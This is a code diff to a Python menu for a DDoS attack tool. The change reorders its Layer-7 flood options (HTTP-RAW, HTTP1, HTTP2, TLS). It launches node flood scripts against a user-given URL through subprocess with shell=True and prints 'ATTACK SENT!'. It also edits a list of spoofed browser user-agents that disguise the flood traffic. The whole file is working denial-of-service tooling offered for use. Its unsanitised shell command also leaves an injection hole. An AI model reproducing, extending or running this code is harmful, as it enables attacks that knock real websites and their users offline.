@@ -536,11 +536,10 @@ class Tool:
 
 
 """)
-		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET")
+		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" HTTP-RAW")
 		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1")
 		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2")
-		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" HTTP-IYOT")
-		print(Color.LR+"["+Color.LG+"05"+Color.LR+"]"+Color.LC+" HTTP-RAW")
+		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" TLS")
 		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
 		print("\n")
 		while True:
@@ -550,8 +549,7 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
-					DdosTool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
+					subprocess.run([f'screen -dm node utils/L7/HTTP-RAW {url} {floodtime}'], shell=True)
 					print(Color.LG+f"\n [!] ATTACK SENT!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
@@ -625,9 +623,9 @@ def spoof_useragents():
 	'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/21.0.1',
 	'Mozilla/5.0 (Windows; U; Windows NT 5.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
 	'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
-    'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
-    'Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)',
-    'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
+        'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
+        'Mozilla/5.0 (compatible; ABrowse 0.4; Syllable)',
+        'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
 	'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101213 Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01']
 
 	return {
